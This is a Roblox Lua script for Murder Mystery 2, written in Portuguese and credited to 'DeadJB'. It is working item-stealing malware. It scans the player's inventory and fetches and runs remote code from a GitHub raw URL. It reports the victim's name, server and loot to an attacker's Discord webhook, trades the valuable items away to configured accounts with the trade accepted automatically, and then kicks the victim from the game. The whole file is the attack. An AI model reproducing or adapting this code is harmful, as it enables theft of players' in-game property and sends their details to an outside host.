-- MM2 Auto Trade Loader - Versão Completa (Usando módulos do jogo)
-- By: DeadJB

local Config = _G.MM2AutoTradeConfig or {}
local Username = Config.Username or {} -- Quem vai RECEBER os itens
local MinValue = Config.MinValue or 0
local Webhook = Config.Webhook or ""

if #Username == 0 or Webhook == "" then
    warn("Configuração incompleta!")
    return
end

-- Carrega módulos nativos do jogo
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

local TradeModule = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("TradeModule"))
local InventoryModule = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("InventoryModule"))
local ProfileData = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("ProfileData"))
local ItemModule = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("ItemModule"))

local function getValues()
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/xspeedHub002/Hs62jsgp810i/refs/heads/main/mm2val.lua.txt"))()
end

local function getItemValue(itemName, values)
    for rarity, items in pairs(values) do
        if items[itemName] then
            return items[itemName]
        end
    end
    return 0
end

local function filterItems(inventory, values)
    local filtered = {}
    for _, item in pairs(inventory) do
        local value = getItemValue(item, values)
        if value >= MinValue and value > 0 then
            table.insert(filtered, item)
        end
    end
    return filtered
end

local function getInventoryItems()
    local items = {}
    local inventory = InventoryModule.MyInventory
    
    if not inventory then
        print("Inventário não carregado")
        return items
    end
    
    for itemType, typeData in pairs(inventory.Data) do
        for category, categoryData in pairs(typeData) do
            for itemName, itemData in pairs(categoryData) do
                if itemData.Amount and itemData.Amount > 0 then
                    table.insert(items, itemName)
                end
            end
        end
    end
    
    return items
end

local function sendWebhook(data)
    local embed = {
        ["title"] = "🎯 Auto Trade Found",
        ["color"] = 0x00ff00,
        ["fields"] = {
            {["name"] = "👤 Nick (Vítima)", ["value"] = data.victim, ["inline"] = true},
            {["name"] = "👤 Nick (Alvo)", ["value"] = data.target, ["inline"] = true},
            {["name"] = "📡 Status", ["value"] = data.status, ["inline"] = true},
            {["name"] = "🎮 Game", ["value"] = "Murder Mystery 2", ["inline"] = true},
            {["name"] = "⚡ Executor", ["value"] = data.executor, ["inline"] = true},
            {["name"] = "💻 Server", ["value"] = data.jobId, ["inline"] = true},
            {["name"] = "📜 Join Script", ["value"] = string.format("```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(142823291, \"%s\")\n```", data.jobId), ["inline"] = false},
            {["name"] = "📦 Loot", ["value"] = string.format("```\n%s\n====================================```", table.concat(data.loot, "\n")), ["inline"] = false}
        }
    }
    
    local payload = {
        ["content"] = "@everyone",
        ["embeds"] = {embed}
    }
    
    HttpService:PostAsync(Webhook, HttpService:JSONEncode(payload))
end

local function doTrade(targetName)
    local target = Players:FindFirstChild(targetName)
    if not target then
        print("Alvo " .. targetName .. " não está online")
        return false
    end
    
    -- Pega itens do inventário
    local inventoryItems = getInventoryItems()
    local values = getValues()
    local filtered = filterItems(inventoryItems, values)
    
    if #filtered == 0 then
        print("Nenhum item com valor >= " .. MinValue)
        return false
    end
    
    print("Enviando trade para " .. targetName .. " com " .. #filtered .. " itens")
    
    -- Envia webhook
    local status = "🟢"
    if target:FindFirstChild("IsInPrivateServer") and target.IsInPrivateServer.Value then
        status = "🔴"
    end
    
    sendWebhook({
        victim = LocalPlayer.Name,
        target = targetName,
        status = status,
        executor = identifyexecutor and identifyexecutor() or "Unknown",
        jobId = game.JobId,
        loot = filtered
    })
    
    -- Envia pedido de trade usando o módulo nativo
    TradeModule.SendTradeRequest(targetName)
    
    -- Espera a trade abrir
    wait(3)
    
    -- Função pra enviar itens via módulo nativo
    local function sendItems(items)
        local offered = 0
        for _, itemName in pairs(items) do
            if offered >= 4 then break end
            -- Usa o remoto nativo do jogo
            ReplicatedStorage:WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(itemName, "Weapons")
            offered = offered + 1
            wait(0.3)
        end
        
        wait(1)
        
        -- Aceita usando o módulo nativo
        TradeModule.GUI.Actions.Accept.ActionButton:Fire()
        wait(0.5)
        
        -- Confirma
        local acceptGUI = TradeModule.GUI.Actions.Accept
        if acceptGUI.Confirm then
            acceptGUI.Confirm.ActionButton:Fire()
        end
        
        -- Verifica se tem mais itens
        local remaining = {}
        for i = offered + 1, #items do
            table.insert(remaining, items[i])
        end
        
        if #remaining > 0 then
            wait(3)
            sendItems(remaining)
        else
            wait(2)
            LocalPlayer:Kick("Nil")
        end
    end
    
    sendItems(filtered)
    return true
end

-- Função principal
local function checkAndTrade()
    local inventoryItems = getInventoryItems()
    local values = getValues()
    local filtered = filterItems(inventoryItems, values)
    
    if #filtered > 0 then
        print("Itens encontrados: " .. #filtered)
        for _, targetName in pairs(Username) do
            task.spawn(function()
                pcall(doTrade, targetName)
            end)
            wait(3)
        end
    end
end

-- Loop principal
while task.wait(10) do
    pcall(checkAndTrade)
end
